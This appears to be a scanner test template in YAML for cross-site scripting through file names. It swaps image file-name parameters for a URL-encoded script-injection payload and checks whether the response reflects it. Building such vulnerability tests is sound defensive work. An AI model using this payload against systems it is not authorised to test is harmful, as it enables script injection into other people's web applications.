id: XSS_VIA_FILE_NAME
info:
  name: "XSS by changing file names"
  description: "Testing vulnerability by injecting malicious scripts in filenames to bypass security measures and execute unauthorized code." 
  details: >
            "Security test that aims to identify vulnerabilities in web applications. By injecting malicious scripts into file names, attackers can bypass security measures and execute unauthorized code on the victim's browser."
            "This test helps developers uncover and address potential XSS (Cross-Site Scripting) vulnerabilities, ensuring robust protection against malicious attacks."
  impact: "An XSS vulnerability can have significant impacts, including the potential for data theft, unauthorized access, session hijacking, defacement of web pages, and the injection of malicious content."
  remediation: "To mitigate XSS by changing file names, implement strict input validation and output encoding. Sanitize user inputs to remove any potentially malicious characters, especially those that could lead to script injection. Use proper encoding mechanisms when generating file names to prevent XSS attacks. Additionally, ensure that file names are treated as opaque data and are not interpreted as HTML or script code. Regularly update and patch your web application and server to address any known vulnerabilities in your code or dependencies that could be exploited for XSS attacks."
  category:
    name: XSS
    shortName: XSS
    displayName: Cross-site scripting (XSS)
  subCategory: XSS_VIA_FILE_NAME
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-community/attacks/xss/"
    - "https://infosecwriteups.com/all-about-file-upload-xss-c72c797aaba3"
  cwe:
    - CWE-79
  cve:
    - CVE-2023-43309
    - CVE-2021-38143

api_selection_filters:
  and:
    response_code:
      gte: 200
      lt: 300

    response_payload:
      contains_either:
        - <!doctype html>

    or:
      - request_payload:
          for_one:
            value:
              contains_either:
                  - .jpg
            key:
              extract: jpg_file_name
      - query_param:
          for_one:
            value:
              contains_either:
                  - .jpg
            key:
              extract: jpg_file_name

      - request_payload:
          for_one:
            value:
              contains_either:
                  - .jpeg
            key:
              extract: jpeg_file_name
      - query_param:
          for_one:
            value:
              contains_either:
                  - .jpeg
            key:
              extract: jpeg_file_name

      - request_payload:
          for_one:
            value:
              contains_either:
                  - .png
            key:
              extract: png_file_name
      - query_param:
          for_one:
            value:
              contains_either:
                  - .png
            key:
              extract: png_file_name

execute:
  type: single
  requests:
    - req:
      - modify_query_param:
          jpg_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpg'
      - modify_body_param:
          jpg_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpg'

      - modify_query_param:
          jpeg_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpeg'
      - modify_body_param:
          jpeg_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpeg'

      - modify_query_param:
          png_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.png'
      - modify_body_param:
          png_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.png'

validate:
  response_payload:
    contains_all:
        - "<script>alert(document.domain)</script>"
        - <!doctype html>